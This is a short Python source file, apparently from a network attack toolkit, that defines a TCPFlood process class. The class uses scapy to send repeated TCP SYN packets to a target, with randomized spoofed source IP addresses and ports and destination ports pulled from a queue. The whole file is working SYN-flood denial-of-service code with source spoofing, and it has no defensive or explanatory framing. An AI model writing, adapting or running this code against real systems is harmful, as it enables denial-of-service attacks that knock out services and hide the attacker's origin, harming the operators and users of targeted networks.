# @Time    : 2020/12/4 11:40 下午
# @Author  : h0rs3fa11
# @FileName: tcp_socket.py
# @Software: PyCharm
from scapy.all import IP, TCP, send
from multiprocessing import Process
from lib.utils.address import random_ip, random_port


class TCPFlood(Process):
    def __init__(self, target, queue, count):
        super().__init__()
        self.target = target
        self.queue = queue
        self.count = count

    def run(self):
        for _ in range(self.count):
            dst_port = self.queue.get()
            packet = IP(src=random_ip(), dst=self.target) / TCP(sport=random_port(), dport=dst_port, flags='S')
            send(packet)
